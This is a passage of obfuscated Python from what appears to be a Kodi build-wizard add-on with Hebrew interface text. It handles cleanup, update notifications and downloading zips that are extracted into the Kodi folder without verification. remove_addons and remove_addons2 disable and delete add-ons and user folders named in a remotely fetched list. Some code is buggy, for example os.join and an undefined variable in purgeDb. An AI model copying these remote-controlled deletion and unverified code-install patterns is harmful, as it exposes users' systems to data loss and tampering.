		for OOO00000O0OOOO0OO ,OO000OOO000OO0OO0 ,O000O00O0OO0O0OO0 in os .walk (OOOO000OOO0OO0OO0 ,topdown =True ):#line:4610
			OO000OOO000OO0OO0 [:]=[OOOO0OOO0O0OOO0O0 for OOOO0OOO0O0OOO0O0 in OO000OOO000OO0OO0 if OOOO0OOO0O0OOO0O0 not in EXCLUDES ]#line:4611
			for O0000OO0OO0O00000 in OO000OOO000OO0OO0 :#line:4612
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O0000OO0OO0O00000 ),'')#line:4613
			  if O0000OO0OO0O00000 not in ["Database","userdata","temp","addons","addon_data"]:#line:4614
			   if not (O0000OO0OO0O00000 =='script.skinshortcuts'and KEEPSKIN =='true'):#line:4615
			    if not (O0000OO0OO0O00000 =='skin.titan'and KEEPSKIN3 =='true'):#line:4617
			      if not (O0000OO0OO0O00000 =='pvr.iptvsimple'and KEEPPVR =='true'):#line:4618
			       if not (O0000OO0OO0O00000 =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:4619
			        if not (O0000OO0OO0O00000 =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:4620
			         if not (O0000OO0OO0O00000 =='program.apollo'and KEEPINFO =='true'):#line:4621
			          if not (O0000OO0OO0O00000 =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:4622
			            if not (O0000OO0OO0O00000 =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:4624
			             if not (O0000OO0OO0O00000 =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:4625
			              if not (O0000OO0OO0O00000 =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:4626
			               if not (O0000OO0OO0O00000 =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:4627
			                if not (O0000OO0OO0O00000 =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:4628
			                 if not (O0000OO0OO0O00000 =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:4629
			                  if not (O0000OO0OO0O00000 =='plugin.video.neptune'and KEEPINFO =='true'):#line:4630
			                   if not (O0000OO0OO0O00000 =='plugin.video.youtube'and KEEPINFO =='true'):#line:4631
			                    if not (O0000OO0OO0O00000 =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:4632
			                     if not (O0000OO0OO0O00000 =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:4633
			                       if not (O0000OO0OO0O00000 =='service.subtitles.All_Subs'and KEEPINFO =='true'):#line:4635
			                           if not (O0000OO0OO0O00000 =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:4639
			                            if not (O0000OO0OO0O00000 =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:4640
			                             if not (O0000OO0OO0O00000 =='plugin.video.torrenter'and KEEPINFO =='true'):#line:4641
			                              if not (O0000OO0OO0O00000 =='plugin.video.quasar'and KEEPINFO =='true'):#line:4642
			                               if not (O0000OO0OO0O00000 =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:4643
			                                  shutil .rmtree (os .path .join (OOO00000O0OOOO0OO ,O0000OO0OO0O00000 ),ignore_errors =True ,onerror =None )#line:4645
			if DP .iscanceled ():#line:4646
				DP .close ()#line:4647
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4648
				return False #line:4649
		DP .close ()#line:4650
		wiz .clearS ('build')#line:4651
		if over ==True :#line:4652
			return True #line:4653
		elif install =='restore':#line:4654
			return True #line:4655
		elif install :#line:4656
			buildWizard (install ,'normal',over =True )#line:4657
		else :#line:4658
			if INSTALLMETHOD ==1 :O0000O0OO0OO00O0O =1 #line:4659
			elif INSTALLMETHOD ==2 :O0000O0OO0OO00O0O =0 #line:4660
			else :O0000O0OO0OO00O0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:4661
			if O0000O0OO0OO00O0O ==1 :wiz .reloadFix ('fresh')#line:4662
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:4663
	else :#line:4664
		if not install =='restore':#line:4665
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:4666
			wiz .refresh ()#line:4667
def clearCache ():#line:4672
		wiz .clearCache ()#line:4673
def fixwizard ():#line:4677
		wiz .fixwizard ()#line:4678
def totalClean ():#line:4680
		wiz .clearCache ()#line:4682
		wiz .clearPackages ('total')#line:4683
		clearThumb ('total')#line:4684
		cleanfornewbuild ()#line:4685
def cleanfornewbuild ():#line:4686
		try :#line:4687
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:4688
		except :#line:4689
			pass #line:4690
		try :#line:4691
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:4692
		except :#line:4693
			pass #line:4694
		try :#line:4695
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:4696
		except :#line:4697
			pass #line:4698
def clearThumb (type =None ):#line:4699
	OO0OO0OOOOOO0OO00 =wiz .latestDB ('Textures')#line:4700
	if not type ==None :OO00OOOO00O0OO000 =1 #line:4701
	else :OO00OOOO00O0OO000 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,OO0OO0OOOOOO0OO00 ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:4702
	if OO00OOOO00O0OO000 ==1 :#line:4703
		try :wiz .removeFile (os .join (DATABASE ,OO0OO0OOOOOO0OO00 ))#line:4704
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (OO0OO0OOOOOO0OO00 )#line:4705
		wiz .removeFolder (THUMBS )#line:4706
	else :wiz .log ('Clear thumbnames cancelled')#line:4708
	wiz .redoThumbs ()#line:4709
def purgeDb ():#line:4711
	O0OOOO000O0OO0OO0 =[];O000O00O0OO00OO00 =[]#line:4712
	for O0O0OOOOOOO0000OO ,OOOOOOO000OOO0000 ,OO0000OOO00O0O00O in os .walk (HOME ):#line:4713
		for OOO00OO000OO0OOOO in fnmatch .filter (OO0000OOO00O0O00O ,'*.db'):#line:4714
			if OOO00OO000OO0OOOO !='Thumbs.db':#line:4715
				OOO00OO0O0OO00O0O =os .path .join (O0O0OOOOOOO0000OO ,OOO00OO000OO0OOOO )#line:4716
				O0OOOO000O0OO0OO0 .append (OOO00OO0O0OO00O0O )#line:4717
				OO00000OO0OOO0O00 =OOO00OO0O0OO00O0O .replace ('\\','/').split ('/')#line:4718
				O000O00O0OO00OO00 .append ('(%s) %s'%(OO00000OO0OOO0O00 [len (OO00000OO0OOO0O00 )-2 ],OO00000OO0OOO0O00 [len (OO00000OO0OOO0O00 )-1 ]))#line:4719
	if KODIV >=16 :#line:4720
		O000O0O00OO000000 =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O000O00O0OO00OO00 )#line:4721
		if O000O0O00OO000000 ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4722
		elif len (O000O0O00OO000000 )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4723
		else :#line:4724
			for OOO0O0OO00O000O00 in O000O0O00OO000000 :wiz .purgeDb (O0OOOO000O0OO0OO0 [OOO0O0OO00O000O00 ])#line:4725
	else :#line:4726
		O000O0O00OO000000 =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O000O00O0OO00OO00 )#line:4727
		if O000O0O00OO000000 ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4728
		else :wiz .purgeDb (O0OOOO000O0OO0OO0 [OOO0O0OO00O000O00 ])#line:4729
def fastupdatefirstbuild (OO0OOOOO0O00O000O ):#line:4735
	xbmc .executebuiltin ((u'Notification(%s,%s)'%('Media Center','בודק אם קיים עדכון בשבילך')))#line:4736
	if ENABLE =='Yes':#line:4737
		if not NOTIFY =='true':#line:4738
			OO0000O0OOOO000O0 =wiz .workingURL (NOTIFICATION )#line:4739
			if OO0000O0OOOO000O0 ==True :#line:4740
				OOOOO000O00000O0O ,O00O0O0000O0O0OOO =wiz .splitNotify (NOTIFICATION )#line:4741
				if not OOOOO000O00000O0O ==False :#line:4743
					try :#line:4744
						OOOOO000O00000O0O =int (OOOOO000O00000O0O );OO0OOOOO0O00O000O =int (OO0OOOOO0O00O000O )#line:4745
						checkidupdate ()#line:4746
						wiz .setS ("notedismiss","true")#line:4747
						if OOOOO000O00000O0O ==OO0OOOOO0O00O000O :#line:4748
							wiz .log ("[Notifications] id[%s] Dismissed"%int (OOOOO000O00000O0O ),xbmc .LOGNOTICE )#line:4749
						elif OOOOO000O00000O0O >OO0OOOOO0O00O000O :#line:4751
							wiz .log ("[Notifications] id: %s"%str (OOOOO000O00000O0O ),xbmc .LOGNOTICE )#line:4752
							wiz .setS ('noteid',str (OOOOO000O00000O0O ))#line:4753
							wiz .setS ("notedismiss","true")#line:4754
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:4757
					except Exception as OOO0O0O0OOO00OOOO :#line:4758
						wiz .log ("Error on Notifications Window: %s"%str (OOO0O0O0OOO00OOOO ),xbmc .LOGERROR )#line:4759
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:4761
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,OO0000O0OOOO000O0 ),xbmc .LOGNOTICE )#line:4762
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:4763
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:4764
def checkidupdate ():#line:4770
				wiz .setS ("notedismiss","true")#line:4772
				O00000O000O000OO0 =wiz .workingURL (NOTIFICATION )#line:4773
				OO0OOOO0OO0O00O00 =" Kodi Premium"#line:4775
				O00O0O0O0O00OOOO0 =wiz .checkBuild (OO0OOOO0OO0O00O00 ,'gui')#line:4776
				O0OOOO00O0000O00O =OO0OOOO0OO0O00O00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4777
				if not wiz .workingURL (O00O0O0O0O00OOOO0 )==True :return #line:4778
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4779
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,OO0OOOO0OO0O00O00 ),'','אנא המתן')#line:4780
				OOOOO0O0O00000O00 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0OOOO00O0000O00O )#line:4781
				try :os .remove (OOOOO0O0O00000O00 )#line:4782
				except :pass #line:4783
				logging .warning (O00O0O0O0O00OOOO0 )#line:4784
				if 'google'in O00O0O0O0O00OOOO0 :#line:4785
				   O0O00O00O000OOOO0 =googledrive_download (O00O0O0O0O00OOOO0 ,OOOOO0O0O00000O00 ,DP ,wiz .checkBuild (OO0OOOO0OO0O00O00 ,'filesize'))#line:4786
				else :#line:4789
				  downloader .download (O00O0O0O0O00OOOO0 ,OOOOO0O0O00000O00 ,DP )#line:4790
				xbmc .sleep (100 )#line:4791
				OO000OO0OO0000OO0 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OOOO0OO0O00O00 )#line:4792
				DP .update (0 ,OO000OO0OO0000OO0 ,'','אנא המתן')#line:4793
				extract .all (OOOOO0O0O00000O00 ,HOME ,DP ,title =OO000OO0OO0000OO0 )#line:4794
				DP .close ()#line:4795
				wiz .defaultSkin ()#line:4796
				wiz .lookandFeelData ('save')#line:4797
				if INSTALLMETHOD ==1 :OO0O0000000OOO00O =1 #line:4800
				elif INSTALLMETHOD ==2 :OO0O0000000OOO00O =0 #line:4801
				else :DP .close ()#line:4802
def gaiaserenaddon ():#line:4804
  O00O00OO00O0000OO =(ADDON .getSetting ("gaiaseren"))#line:4805
  OOO000OOO0OO0O00O =(ADDON .getSetting ("rdbuild"))#line:4806
  if O00O00OO00O0000OO =='true'and OOO000OOO0OO0O00O =='true':#line:4807
    O000000OO0O0O0OO0 =(NEWFASTUPDATE )#line:4808
    OO0O0OOO00OO000O0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:4809
    O0OO0O0O0O0O0OO0O =xbmcgui .DialogProgress ()#line:4810
    O0OO0O0O0O0O0OO0O .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:4811
    O0OO0OOOOOO000OO0 =os .path .join (PACKAGES ,'isr.zip')#line:4812
    OOOOOOO0OOO0OOO00 =urllib2 .Request (O000000OO0O0O0OO0 )#line:4813
    O000O0O0OO000OOOO =urllib2 .urlopen (OOOOOOO0OOO0OOO00 )#line:4814
    OO000O0OO0000O000 =xbmcgui .DialogProgress ()#line:4816
    OO000O0OO0000O000 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:4817
    OO000O0OO0000O000 .update (0 )#line:4818
    O0O000O0000OOOOOO =open (O0OO0OOOOOO000OO0 ,'wb')#line:4820
    try :#line:4822
      OOO00000000O000OO =O000O0O0OO000OOOO .info ().getheader ('Content-Length').strip ()#line:4823
      O00OO0OO0OO000OOO =True #line:4824
    except AttributeError :#line:4825
          O00OO0OO0OO000OOO =False #line:4826
    if O00OO0OO0OO000OOO :#line:4828
          OOO00000000O000OO =int (OOO00000000O000OO )#line:4829
    O00O000O0000OOOO0 =0 #line:4831
    OOO0000O0000000O0 =time .time ()#line:4832
    while True :#line:4833
          O0O00O00O0000OOOO =O000O0O0OO000OOOO .read (8192 )#line:4834
          if not O0O00O00O0000OOOO :#line:4835
              sys .stdout .write ('\n')#line:4836
              break #line:4837
          O00O000O0000OOOO0 +=len (O0O00O00O0000OOOO )#line:4839
          O0O000O0000OOOOOO .write (O0O00O00O0000OOOO )#line:4840
          if not O00OO0OO0OO000OOO :#line:4842
              OOO00000000O000OO =O00O000O0000OOOO0 #line:4843
          if OO000O0OO0000O000 .iscanceled ():#line:4844
             OO000O0OO0000O000 .close ()#line:4845
             try :#line:4846
              os .remove (O0OO0OOOOOO000OO0 )#line:4847
             except :#line:4848
              pass #line:4849
             break #line:4850
          O0O0000O00OOOO000 =float (O00O000O0000OOOO0 )/OOO00000000O000OO #line:4851
          O0O0000O00OOOO000 =round (O0O0000O00OOOO000 *100 ,2 )#line:4852
          OOOOO00O0OOO00O0O =O00O000O0000OOOO0 /(1024 *1024 )#line:4853
          OOO000O00OO0O00O0 =OOO00000000O000OO /(1024 *1024 )#line:4854
          O0OO000O000OOO0OO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOOOO00O0OOO00O0O ,'teal',OOO000O00OO0O00O0 )#line:4855
          if (time .time ()-OOO0000O0000000O0 )>0 :#line:4856
            OOOOOOO0OO0O0O0O0 =O00O000O0000OOOO0 /(time .time ()-OOO0000O0000000O0 )#line:4857
            OOOOOOO0OO0O0O0O0 =OOOOOOO0OO0O0O0O0 /1024 #line:4858
          else :#line:4859
           OOOOOOO0OO0O0O0O0 =0 #line:4860
          O0O00OO0O0O00000O ='KB'#line:4861
          if OOOOOOO0OO0O0O0O0 >=1024 :#line:4862
             OOOOOOO0OO0O0O0O0 =OOOOOOO0OO0O0O0O0 /1024 #line:4863
             O0O00OO0O0O00000O ='MB'#line:4864
          if OOOOOOO0OO0O0O0O0 >0 and not O0O0000O00OOOO000 ==100 :#line:4865
              OO0O0O00OOO0OOOO0 =(OOO00000000O000OO -O00O000O0000OOOO0 )/OOOOOOO0OO0O0O0O0 #line:4866
          else :#line:4867
              OO0O0O00OOO0OOOO0 =0 #line:4868
          OO00O0OO0O000O0O0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOOOOOO0OO0O0O0O0 ,O0O00OO0O0O00000O )#line:4869
          OO000O0OO0000O000 .update (int (O0O0000O00OOOO000 ),O0OO000O000OOO0OO ,OO00O0OO0O000O0O0 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:4871
    OOOOO00000000O000 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:4874
    O0O000O0000OOOOOO .close ()#line:4877
    extract .all (O0OO0OOOOOO000OO0 ,OOOOO00000000O000 ,OO000O0OO0000O000 )#line:4878
    try :#line:4882
      os .remove (O0OO0OOOOOO000OO0 )#line:4883
    except :#line:4884
      pass #line:4885
def testnotify ():#line:4887
	O0O00O00000OOO00O =wiz .workingURL (NOTIFICATION )#line:4888
	if O0O00O00000OOO00O ==True :#line:4889
		try :#line:4890
			OO0O0O0OOOO000O0O ,OOO00O00O00O0000O =wiz .splitNotify (NOTIFICATION )#line:4891
			if OO0O0O0OOOO000O0O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:4892
			if STARTP2 ()=='ok':#line:4893
				notify .notification (OOO00O00O00O0000O ,True )#line:4894
		except Exception as OOO0O000OOO0OOOOO :#line:4895
			wiz .log ("Error on Notifications Window: %s"%str (OOO0O000OOO0OOOOO ),xbmc .LOGERROR )#line:4896
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:4897
def testnotify2 ():#line:4898
	O0OO00OO00OOOOOO0 =wiz .workingURL (NOTIFICATION2 )#line:4899
	if O0OO00OO00OOOOOO0 ==True :#line:4900
		try :#line:4901
			O0O0000OOO0OOO0OO ,OOO0000O00O00O0O0 =wiz .splitNotify (NOTIFICATION2 )#line:4902
			if O0O0000OOO0OOO0OO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:4903
			if STARTP2 ()=='ok':#line:4904
				notify .notification2 (OOO0000O00O00O0O0 ,True )#line:4905
		except Exception as OOOOO0000O000OO00 :#line:4906
			wiz .log ("Error on Notifications Window: %s"%str (OOOOO0000O000OO00 ),xbmc .LOGERROR )#line:4907
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:4908
def testnotify3 ():#line:4909
	O00OOOO000O00000O =wiz .workingURL (NOTIFICATION3 )#line:4910
	if O00OOOO000O00000O ==True :#line:4911
		try :#line:4912
			OO0O000OO0OOO00O0 ,O0O0O00000O0OOO0O =wiz .splitNotify (NOTIFICATION3 )#line:4913
			if OO0O000OO0OOO00O0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:4914
			if STARTP2 ()=='ok':#line:4915
				notify .notification3 (O0O0O00000O0OOO0O ,True )#line:4916
		except Exception as OO0O00O00OOOOO0O0 :#line:4917
			wiz .log ("Error on Notifications Window: %s"%str (OO0O00O00OOOOO0O0 ),xbmc .LOGERROR )#line:4918
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:4919
def servicemanual ():#line:4920
	OO0OOO00OOOOO0O00 =wiz .workingURL (HELPINFO )#line:4921
	if OO0OOO00OOOOO0O00 ==True :#line:4922
		try :#line:4923
			O000OO0O00OOO0OO0 ,O00OOOOOOO0O00OO0 =wiz .splitNotify (HELPINFO )#line:4924
			if O000OO0O00OOO0OO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:4925
			notify .helpinfo (O00OOOOOOO0O00OO0 ,True )#line:4926
		except Exception as O0OO0OOOOO00O000O :#line:4927
			wiz .log ("Error on Notifications Window: %s"%str (O0OO0OOOOO00O000O ),xbmc .LOGERROR )#line:4928
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:4929
def testupdate ():#line:4931
	if BUILDNAME =="":#line:4932
		notify .updateWindow ()#line:4933
	else :#line:4934
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:4935
def testfirst ():#line:4937
	notify .firstRun ()#line:4938
def testfirstRun ():#line:4940
	notify .firstRunSettings ()#line:4941
def fastinstall ():#line:4944
	notify .firstRuninstall ()#line:4945
def addDir (OOOO00O00OO0000O0 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:4952
	O0OOOO0OOOO0OOO00 =sys .argv [0 ]#line:4953
	if not mode ==None :O0OOOO0OOOO0OOO00 +="?mode=%s"%urllib .quote_plus (mode )#line:4954
	if not name ==None :O0OOOO0OOOO0OOO00 +="&name="+urllib .quote_plus (name )#line:4955
	if not url ==None :O0OOOO0OOOO0OOO00 +="&url="+urllib .quote_plus (url )#line:4956
	O00O0O00OOOOOO0O0 =True #line:4957
	if themeit :OOOO00O00OO0000O0 =themeit %OOOO00O00OO0000O0 #line:4958
	O00O0OOOOOO0OOO0O =xbmcgui .ListItem (OOOO00O00OO0000O0 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:4959
	O00O0OOOOOO0OOO0O .setInfo (type ="Video",infoLabels ={"Title":OOOO00O00OO0000O0 ,"Plot":description })#line:4960
	O00O0OOOOOO0OOO0O .setProperty ("Fanart_Image",fanart )#line:4961
	if not menu ==None :O00O0OOOOOO0OOO0O .addContextMenuItems (menu ,replaceItems =overwrite )#line:4962
	O00O0O00OOOOOO0O0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0OOOO0OOOO0OOO00 ,listitem =O00O0OOOOOO0OOO0O ,isFolder =True )#line:4963
	return O00O0O00OOOOOO0O0 #line:4964
def addFile (O0O0O0OO000000O00 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:4966
	O0OOO0OO000OOO00O =sys .argv [0 ]#line:4967
	if not mode ==None :O0OOO0OO000OOO00O +="?mode=%s"%urllib .quote_plus (mode )#line:4968
	if not name ==None :O0OOO0OO000OOO00O +="&name="+urllib .quote_plus (name )#line:4969
	if not url ==None :O0OOO0OO000OOO00O +="&url="+urllib .quote_plus (url )#line:4970
	OOOOO0O0000O00OOO =True #line:4971
	if themeit :O0O0O0OO000000O00 =themeit %O0O0O0OO000000O00 #line:4972
	O0O0000OOOOO0OOOO =xbmcgui .ListItem (O0O0O0OO000000O00 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:4973
	O0O0000OOOOO0OOOO .setInfo (type ="Video",infoLabels ={"Title":O0O0O0OO000000O00 ,"Plot":description })#line:4974
	O0O0000OOOOO0OOOO .setProperty ("Fanart_Image",fanart )#line:4975
	if not menu ==None :O0O0000OOOOO0OOOO .addContextMenuItems (menu ,replaceItems =overwrite )#line:4976
	OOOOO0O0000O00OOO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0OOO0OO000OOO00O ,listitem =O0O0000OOOOO0OOOO ,isFolder =False )#line:4977
	return OOOOO0O0000O00OOO #line:4978
def get_params ():#line:4980
	OOO0O0O0OO00O0O00 =[]#line:4981
	OOO000O00OO00OO0O =sys .argv [2 ]#line:4982
	if len (OOO000O00OO00OO0O )>=2 :#line:4983
		OOOOO0000O00OO0O0 =sys .argv [2 ]#line:4984
		O0000OO0O000O0000 =OOOOO0000O00OO0O0 .replace ('?','')#line:4985
		if (OOOOO0000O00OO0O0 [len (OOOOO0000O00OO0O0 )-1 ]=='/'):#line:4986
			OOOOO0000O00OO0O0 =OOOOO0000O00OO0O0 [0 :len (OOOOO0000O00OO0O0 )-2 ]#line:4987
		OOOOOO00O0O0O000O =O0000OO0O000O0000 .split ('&')#line:4988
		OOO0O0O0OO00O0O00 ={}#line:4989
		for O0000O0O00OOOO0O0 in range (len (OOOOOO00O0O0O000O )):#line:4990
			OOO000O00O00O0O0O ={}#line:4991
			OOO000O00O00O0O0O =OOOOOO00O0O0O000O [O0000O0O00OOOO0O0 ].split ('=')#line:4992
			if (len (OOO000O00O00O0O0O ))==2 :#line:4993
				OOO0O0O0OO00O0O00 [OOO000O00O00O0O0O [0 ]]=OOO000O00O00O0O0O [1 ]#line:4994
		return OOO0O0O0OO00O0O00 #line:4996
def remove_addons ():#line:4998
	try :#line:4999
			import json #line:5000
			OOOO0OOOO0O0O0OO0 =urllib2 .urlopen (remove_url ).readlines ()#line:5001
			for OOO0O0OOO0O0000OO in OOOO0OOOO0O0O0OO0 :#line:5002
				OOO0OOOOOOOOO0000 =OOO0O0OOO0O0000OO .split (':')[1 ].strip ()#line:5004
				OO0O0O00OO0000OOO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(OOO0OOOOOOOOO0000 ,'false')#line:5005
				O000OOO00O000O00O =xbmc .executeJSONRPC (OO0O0O00OO0000OOO )#line:5006
				O0OO00O000O00OOOO =json .loads (O000OOO00O000O00O )#line:5007
				OO0OOO00OO0O00OOO =os .path .join (addons_folder ,OOO0OOOOOOOOO0000 )#line:5009
				if os .path .exists (OO0OOO00OO0O00OOO ):#line:5011
					for O0O000OO0000000OO ,O0OO0OOOOO0OO000O ,O0OOOO0OOOOOO000O in os .walk (OO0OOO00OO0O00OOO ):#line:5012
						for OOO0000O0OO0O0000 in O0OOOO0OOOOOO000O :#line:5013
							os .unlink (os .path .join (O0O000OO0000000OO ,OOO0000O0OO0O0000 ))#line:5014
						for O00000O0OO00OO0OO in O0OO0OOOOO0OO000O :#line:5015
							shutil .rmtree (os .path .join (O0O000OO0000000OO ,O00000O0OO00OO0OO ))#line:5016
					os .rmdir (OO0OOO00OO0O00OOO )#line:5017
			xbmc .executebuiltin ('Container.Refresh')#line:5019
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:5020
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:5021
	except :pass #line:5022
def remove_addons2 ():#line:5023
	try :#line:5024
			import json #line:5025
			O00O0OO0O000O0000 =urllib2 .urlopen (remove_url2 ).readlines ()#line:5026
			for OOOO00O00OOOOO000 in O00O0OO0O000O0000 :#line:5027
				OO000O0OOOOO000O0 =OOOO00O00OOOOO000 .split (':')[1 ].strip ()#line:5029
				O00OO00000O00O0O0 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(OO000O0OOOOO000O0 ,'false')#line:5030
				OOOOO0O00000OOOOO =xbmc .executeJSONRPC (O00OO00000O00O0O0 )#line:5031
				O000O0OOOOOOO00OO =json .loads (OOOOO0O00000OOOOO )#line:5032
				O00O00OO00OOOO00O =os .path .join (user_folder ,OO000O0OOOOO000O0 )#line:5034
				if os .path .exists (O00O00OO00OOOO00O ):#line:5036
					for O00OO000O00OO0O00 ,OOOO0O00O0O000O00 ,O0O0O00OO000OO00O in os .walk (O00O00OO00OOOO00O ):#line:5037
						for OOO00000O0OO0O00O in O0O0O00OO000OO00O :#line:5038
							os .unlink (os .path .join (O00OO000O00OO0O00 ,OOO00000O0OO0O00O ))#line:5039
						for OOO0OOOO0000O0OO0 in OOOO0O00O0O000O00 :#line:5040
							shutil .rmtree (os .path .join (O00OO000O00OO0O00 ,OOO0OOOO0000O0OO0 ))#line:5041
					os .rmdir (O00O00OO00OOOO00O )#line:5042
	except :pass #line:5044
params =get_params ()#line:5045
url =None #line:5046
name =None #line:5047
mode =None #line:5048
try :mode =urllib .unquote_plus (params ["mode"])#line:5050
except :pass #line:5051
try :name =urllib .unquote_plus (params ["name"])#line:5052
except :pass #line:5053
try :url =urllib .unquote_plus (params ["url"])#line:5054
except :pass #line:5055
wiz .log ('[ Version : \'%s\' ] [ Mode : \'%s\' ] [ Name : \'%s\' ] [ Url : \'%s\' ]'%(VERSION ,mode if not mode ==''else None ,name ,url ))#line:5057
